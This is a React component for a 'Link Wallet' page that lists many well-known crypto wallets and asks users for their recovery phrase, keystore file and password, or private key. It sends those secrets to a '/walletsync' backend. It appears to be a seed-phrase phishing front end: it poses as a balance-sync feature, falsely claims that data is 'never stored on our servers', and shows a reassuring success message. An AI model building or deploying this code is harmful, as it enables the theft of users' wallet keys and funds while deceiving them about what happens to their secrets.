import { useState } from "react"
import { X, Eye, EyeOff, Shield, Key, FileText } from "lucide-react"
import api from "../../lib/api";


/** Build a proxy URL to bypass hotlink/CORS issues */
const proxify = (url) => {
  try {
    const u = new URL(url)
    // weserv strips protocol; if it fails we just return original
    return `https://images.weserv.nl/?url=${u.host}${u.pathname}${u.search || ""}`
  } catch {
    return url
  }
}

/** Robust logo that tries multiple sources + a proxy, then falls back to initials */
function SmartLogo({ sources, alt, size = 48, initials = "W" }) {
  const base = Array.isArray(sources) ? sources : [sources].filter(Boolean)
  const withProxy = base.flatMap((s) => [s, proxify(s)])
  const [idx, setIdx] = useState(0)
  const src = withProxy[idx]

  if (!src) {
    return (
      <span
        className="inline-flex items-center justify-center rounded-full text-white"
        style={{
          width: size, height: size,
          background: "linear-gradient(135deg,#2563eb,#7c3aed)",
          fontSize: Math.max(10, size * 0.34), fontWeight: 700
        }}
        aria-label={alt}
      >
        {initials}
      </span>
    )
  }

  return (
    // eslint-disable-next-line
    <img
      src={src}
      alt={alt}
      className="rounded-full object-contain bg-white/5"
      style={{ width: size, height: size }}
      onError={() => setIdx((i) => i + 1)}
      referrerPolicy="no-referrer"
    />
  )
}

/** Helper to compute nice initials from name */
const initialsOf = (name) =>
  name.split(/\s+/).map(s => s[0]).join("").slice(0,3).toUpperCase()

/** Connection method types */
const CONNECTION_METHODS = {
  PHRASE: 'phrase',
  KEYSTORE: 'keystore',
  PRIVATE_KEY: 'private_key'
}

/** Wallet list (Binance & Coinbase moved to the end) */
const wallets = [
  // --- Top wallets first ---
  { name: "Trust Wallet", logos: [
    "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x4B0F1812e5Df2A09796481Ff14017e6005508003/logo.png",
    "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/twt.png",
    "https://upload.wikimedia.org/wikipedia/commons/5/5c/Trust_Wallet_Logo.png",
  ]},
  { name: "MetaMask", logos: [
    "https://raw.githubusercontent.com/MetaMask/brand-resources/main/SVG/metamask-fox.svg",
    "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/eth.png",
    "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
  ]},
  { name: "Phantom", logos: [
    "https://raw.githubusercontent.com/phantom-labs/symbols/main/phantom-icon-purple.png",
    "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/sol.png",
  ]},
  { name: "SafePal", logos: [
    "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/sfp.png",
    "https://www.safepal.com/static/favicon.ico",
  ]},
  { name: "Exodus", logos: [
    "https://upload.wikimedia.org/wikipedia/commons/5/57/Exodus_logo.svg",
    "https://www.exodus.com/favicon.ico",
  ]},
  { name: "Ledger Live", logos: [
    "https://upload.wikimedia.org/wikipedia/commons/4/4a/Ledger_logo.svg",
    "https://www.ledger.com/wp-content/uploads/2024/01/favicon-192x192-1.png",
  ]},
  { name: "Trezor Suite", logos: [
    "https://upload.wikimedia.org/wikipedia/commons/3/3b/Trezor_logo.svg",
    "https://trezor.io/favicon.ico",
  ]},
  { name: "Atomic Wallet", logos: [
    "https://upload.wikimedia.org/wikipedia/commons/2/24/Atomic_Wallet_logo.svg",
    "https://atomicwallet.io/favicon.ico",
  ]},
  { name: "Rainbow", logos: [
    "https://seeklogo.com/images/R/rainbow-logo-B0EAEF53ED-seeklogo.com.png",
    "https://rainbow.me/favicon.ico",
  ]},
  { name: "Argent", logos: [
    "https://avatars.githubusercontent.com/u/24589459?s=200&v=4",
    "https://www.argent.xyz/favicon.ico",
  ]},
  { name: "Zerion", logos: [
    "https://raw.githubusercontent.com/zeriontech/assets/master/images/icon-512x512.png",
    "https://raw.githubusercontent.com/trustwallet/assets/master/dapps/zerion.io.png",
  ]},
  { name: "MathWallet", logos: [
    "https://mathwallet.org/images/mathwallet.png",
    "https://mathwallet.org/img/favicon.png",
  ]},
  { name: "TokenPocket", logos: [
    "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/tpt.png",
    "https://tokenpocket.pro/favicon.ico",
  ]},
  { name: "Bitget Wallet (ex BitKeep)", logos: [
    "https://assets.bitgetimg.com/bitkeep/official/website/icon.png",
    "https://seeklogo.com/images/B/bitkeep-logo-2D31B7841D-seeklogo.com.png",
  ]},
  { name: "Crypto.com DeFi Wallet", logos: [
    "https://upload.wikimedia.org/wikipedia/en/3/30/Crypto.com_app_logo.png",
    "https://upload.wikimedia.org/wikipedia/en/2/29/Crypto.com_logo.svg",
  ]},
  { name: "Coinomi", logos: [
    "https://www.coinomi.com/assets/img/coinomi-logo.svg",
    "https://www.coinomi.com/favicon.ico",
  ]},
  { name: "Trustee Wallet", logos: [
    "https://trustee.deals/assets/images/favicon/apple-touch-icon.png",
    "https://trustee.deals/favicon-32x32.png",
  ]},
  { name: "Guarda", logos: [
    "https://guarda.com/favicon-196x196.png",
    "https://guarda.com/android-chrome-192x192.png",
  ]},
  { name: "Edge Wallet", logos: [
    "https://edge.app/wp-content/uploads/2021/06/edge-logo.2bfa9a5c.svg",
    "https://edge.app/favicon.ico",
  ]},
  { name: "Coin98", logos: [
    "https://coin98.s3.ap-southeast-1.amazonaws.com/logo.png",
    "https://coin98.com/favicon.ico",
  ]},
  // ...continue adding entries; keep 2–3 logo candidates per wallet

  // --- Move these two to the end as requested ---
  { name: "Binance Chain Wallet", logos: [
    "https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png",
    "https://upload.wikimedia.org/wikipedia/commons/1/12/Binance_logo.svg",
    "https://www.binance.com/resources/img/logo-en.svg",
  ]},
  { name: "Coinbase Wallet", logos: [
    "https://upload.wikimedia.org/wikipedia/commons/1/1a/Coinbase_Wallet_Logo.png",
    "https://static-assets.coinbase.com/ui/favicon-196x196.png",
    "https://www.coinbase.com/favicon.ico",
  ]},
]

export default function WalletSync() {
  const [open, setOpen] = useState(false)
  const [selected, setSelected] = useState(null)
  const [activeMethod, setActiveMethod] = useState(null)
  const [showPassword, setShowPassword] = useState(false)
  const [formData, setFormData] = useState({
    phrase: '',
    keystore: '',
    password: '',
    privateKey: ''
  })
  const [isLoading, setIsLoading] = useState(false)
  const [statusMessage, setStatusMessage] = useState(null) // ✅ new state

  const openModal = (wallet) => { 
    setSelected(wallet); 
    setOpen(true); 
    setActiveMethod(null);
    setFormData({ phrase: '', keystore: '', password: '', privateKey: '' });
  }
  
  const closeModal = () => { 
    setOpen(false); 
    setSelected(null); 
    setActiveMethod(null);
    setFormData({ phrase: '', keystore: '', password: '', privateKey: '' });
  }

  const handleMethodSelect = (method) => {
    setActiveMethod(method)
  }

  const handleInputChange = (field, value) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }))
  }

 const handleSubmit = async (e) => {
  e.preventDefault();
  if (!activeMethod || !selected) return;

  setIsLoading(true);
  try {
    await api.post("/walletsync", {
      walletName: selected.name,
      method: activeMethod,
      data: formData,
    });

    setStatusMessage({ type: "success", text: "Wallet linked successfully! Pending." });
    setTimeout(() => setStatusMessage(null), 5000);
    closeModal();
  } catch (error) {
    console.error("Wallet sync failed:", error?.response?.data || error.message);
    setStatusMessage({ type: "error", text: "Failed to link wallet. Please try again." });
    setTimeout(() => setStatusMessage(null), 5000);
  } finally {
    setIsLoading(false);
  }
};


  const getMethodIcon = (method) => {
    switch (method) {
      case CONNECTION_METHODS.PHRASE: return <Key className="h-4 w-4" />
      case CONNECTION_METHODS.KEYSTORE: return <FileText className="h-4 w-4" />
      case CONNECTION_METHODS.PRIVATE_KEY: return <Shield className="h-4 w-4" />
      default: return <Key className="h-4 w-4" />
    }
  }

  const getMethodTitle = (method) => {
    switch (method) {
      case CONNECTION_METHODS.PHRASE: return "Recovery Phrase"
      case CONNECTION_METHODS.KEYSTORE: return "Keystore JSON"
      case CONNECTION_METHODS.PRIVATE_KEY: return "Private Key"
      default: return "Connect Wallet"
    }
  }

  return (
    <section className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-semibold text-gray-900 dark:text-white">Link Wallet</h1>
          <p className="text-sm text-gray-500 dark:text-gray-400">
            Connect your preferred wallet securely to sync balances and transactions.
          </p>
        </div>
      </div>

      {/* ✅ Success or error message */}
      {statusMessage && (
        <div
          className={`rounded-xl p-4 text-sm font-medium ${
            statusMessage.type === "success"
              ? "bg-green-50 text-green-700 border border-green-200"
              : "bg-red-50 text-red-700 border border-red-200"
          }`}
        >
          {statusMessage.text}
        </div>
      )}

      <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
        {wallets.map((w) => (
          <div
            key={w.name}
            className="group relative flex flex-col items-center justify-center rounded-2xl border border-gray-200 bg-white p-4 shadow-sm transition-all duration-200 hover:shadow-lg hover:border-blue-200 dark:border-gray-800 dark:bg-gray-900 dark:hover:border-blue-800"
          >
            <SmartLogo
              sources={w.logos}
              alt={w.name}
              size={48}
              initials={initialsOf(w.name)}
            />
            <h3 className="mt-2 text-sm font-semibold text-gray-900 dark:text-gray-100">{w.name}</h3>
            <button
              onClick={() => openModal(w)}
              className="mt-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 px-3 py-1.5 text-xs font-semibold text-white shadow-lg hover:from-blue-700 hover:to-indigo-700 transition-all duration-200 transform hover:scale-105"
            >
              Connect
            </button>
          </div>
        ))}
      </div>

      {/* Enhanced Modal */}
      {open && selected && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={closeModal} />
          <div className="relative z-10 w-full max-w-md rounded-2xl border border-gray-200 bg-white shadow-2xl dark:border-gray-700 dark:bg-gray-900">
            {/* Header */}
            <div className="flex items-center justify-between p-6 border-b border-gray-100 dark:border-gray-800">
              <div className="flex items-center space-x-3">
                <SmartLogo sources={selected.logos} alt={selected.name} size={40} initials={initialsOf(selected.name)} />
                <div>
                  <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
                    Connect {selected.name}
                  </h2>
                  <p className="text-sm text-gray-500 dark:text-gray-400">
                    Choose your connection method
                  </p>
                </div>
              </div>
              <button
                onClick={closeModal}
                className="rounded-lg p-2 text-gray-500 hover:bg-gray-100 hover:text-gray-700 dark:text-gray-400 dark:hover:bg-gray-800 dark:hover:text-gray-200 transition-colors"
              >
                <X className="h-5 w-5" />
              </button>
            </div>

            {/* Content */}
            <div className="p-6">
              {!activeMethod ? (
                // Method Selection
                <div className="space-y-3">
                  <button 
                    onClick={() => handleMethodSelect(CONNECTION_METHODS.PHRASE)}
                    className="w-full flex items-center justify-between rounded-xl border border-gray-200 bg-white p-4 text-left hover:border-blue-300 hover:bg-blue-50 dark:border-gray-700 dark:bg-gray-800 dark:hover:border-blue-600 dark:hover:bg-blue-900/20 transition-all duration-200 group"
                  >
                    <div className="flex items-center space-x-3">
                      <div className="rounded-lg bg-blue-100 p-2 dark:bg-blue-900/30">
                        <Key className="h-4 w-4 text-blue-600 dark:text-blue-400" />
                      </div>
                      <div>
                        <div className="font-medium text-gray-900 dark:text-white">Recovery Phrase</div>
                        <div className="text-sm text-gray-500 dark:text-gray-400">12 or 24-word phrase</div>
                      </div>
                    </div>
                  </button>

                  <button 
                    onClick={() => handleMethodSelect(CONNECTION_METHODS.KEYSTORE)}
                    className="w-full flex items-center justify-between rounded-xl border border-gray-200 bg-white p-4 text-left hover:border-blue-300 hover:bg-blue-50 dark:border-gray-700 dark:bg-gray-800 dark:hover:border-blue-600 dark:hover:bg-blue-900/20 transition-all duration-200 group"
                  >
                    <div className="flex items-center space-x-3">
                      <div className="rounded-lg bg-green-100 p-2 dark:bg-green-900/30">
                        <FileText className="h-4 w-4 text-green-600 dark:text-green-400" />
                      </div>
                      <div>
                        <div className="font-medium text-gray-900 dark:text-white">Keystore JSON</div>
                        <div className="text-sm text-gray-500 dark:text-gray-400">Encrypted wallet file</div>
                      </div>
                    </div>
                  </button>

                  <button 
                    onClick={() => handleMethodSelect(CONNECTION_METHODS.PRIVATE_KEY)}
                    className="w-full flex items-center justify-between rounded-xl border border-gray-200 bg-white p-4 text-left hover:border-blue-300 hover:bg-blue-50 dark:border-gray-700 dark:bg-gray-800 dark:hover:border-blue-600 dark:hover:bg-blue-900/20 transition-all duration-200 group"
                  >
                    <div className="flex items-center space-x-3">
                      <div className="rounded-lg bg-purple-100 p-2 dark:bg-purple-900/30">
                        <Shield className="h-4 w-4 text-purple-600 dark:text-purple-400" />
                      </div>
                      <div>
                        <div className="font-medium text-gray-900 dark:text-white">Private Key</div>
                        <div className="text-sm text-gray-500 dark:text-gray-400">Single private key</div>
                      </div>
                    </div>
                  </button>
                </div>
              ) : (
                // Input Form
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div className="flex items-center space-x-2 mb-4">
                    <button
                      type="button"
                      onClick={() => setActiveMethod(null)}
                      className="rounded-lg p-2 text-gray-500 hover:bg-gray-100 dark:text-gray-400 dark:hover:bg-gray-800"
                    >
                      <X className="h-4 w-4" />
                    </button>
                    <div className="flex items-center space-x-2">
                      <div className="rounded-lg bg-blue-100 p-2 dark:bg-blue-900/30">
                        {getMethodIcon(activeMethod)}
                      </div>
                      <h3 className="font-semibold text-gray-900 dark:text-white">
                        {getMethodTitle(activeMethod)}
                      </h3>
                    </div>
                  </div>

                  {activeMethod === CONNECTION_METHODS.PHRASE && (
  <div className="space-y-3">
    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
      Recovery Phrase
    </label>

    {(() => {
  const wordCount = selected?.name?.toLowerCase().includes("trust")
    ? 12
    : 24;

  const words = formData.phrase
    ? formData.phrase.split(" ")
    : Array(wordCount).fill("");

  const handleWordChange = (index, value) => {
    const updated = [...words];
    updated[index] = value.trim();
    handleInputChange("phrase", updated.join(" ").trim());
  };

  return (
    <div className="grid grid-cols-2 gap-3">
      {Array.from({ length: wordCount }).map((_, i) => (
        <div
          key={i}
          className="flex items-center space-x-2 bg-white dark:bg-gray-900 p-2 rounded-lg border border-gray-200 dark:border-gray-700"
        >
          <span className="text-xs font-medium text-gray-500 dark:text-gray-400 w-4 text-right">
            {i + 1}.
          </span>
          <input
            type="text"
            value={words[i] || ""}
            onChange={(e) => handleWordChange(i, e.target.value)}
            placeholder={`word ${i + 1}`}
            className="flex-1 rounded-md border border-gray-300 bg-white px-2 py-1 text-xs
                       focus:border-blue-500 focus:ring-1 focus:ring-blue-200
                       dark:border-gray-600 dark:bg-gray-800 dark:text-white"
            required
          />
        </div>
      ))}
    </div>
  );
})()}


    <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
      {selected?.name?.toLowerCase().includes("trust")
        ? "Enter your 12-word recovery phrase."
        : "Enter your 24-word recovery phrase."}
    </p>
  </div>
)}


                  {activeMethod === CONNECTION_METHODS.KEYSTORE && (
                    <div className="space-y-3">
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                        Keystore JSON
                      </label>
                      <textarea
                        value={formData.keystore}
                        onChange={(e) => handleInputChange('keystore', e.target.value)}
                        placeholder="Paste your keystore JSON content"
                        rows="4"
                        className="w-full rounded-xl border border-gray-300 bg-white px-4 py-3 text-sm placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white dark:focus:border-blue-500 font-mono text-xs"
                        required
                      />
                      <div className="relative">
                        <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                          Password
                        </label>
                        <input
                          type={showPassword ? "text" : "password"}
                          value={formData.password}
                          onChange={(e) => handleInputChange('password', e.target.value)}
                          placeholder="Enter keystore password"
                          className="w-full rounded-xl border border-gray-300 bg-white px-4 py-3 pr-10 text-sm placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white dark:focus:border-blue-500"
                          required
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-3 top-9 text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
                        >
                          {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                        </button>
                      </div>
                    </div>
                  )}

                  {activeMethod === CONNECTION_METHODS.PRIVATE_KEY && (
                    <div className="space-y-3">
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300">
                        Private Key
                      </label>
                      <textarea
                        value={formData.privateKey}
                        onChange={(e) => handleInputChange('privateKey', e.target.value)}
                        placeholder="Enter your private key"
                        rows="3"
                        className="w-full rounded-xl border border-gray-300 bg-white px-4 py-3 text-sm placeholder-gray-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white dark:focus:border-blue-500 font-mono text-xs"
                        required
                      />
                    </div>
                  )}

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 py-3 font-semibold text-white shadow-lg hover:from-blue-700 hover:to-indigo-700 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02]"
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center space-x-2">
                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
                        <span>Connecting...</span>
                      </div>
                    ) : (
                      `Connect to ${selected.name}`
                    )}
                  </button>
                </form>
              )}
            </div>

            {/* Footer */}
            <div className="border-t border-gray-100 bg-gray-50 px-6 py-4 dark:border-gray-800 dark:bg-gray-800/50">
              <div className="flex items-center justify-center space-x-2 text-xs text-gray-500 dark:text-gray-400">
                <Shield className="h-3 w-3" />
                <span>Your data is encrypted and never stored on our servers</span>
              </div>
            </div>
          </div>
        </div>
      )}
    </section>
  )
}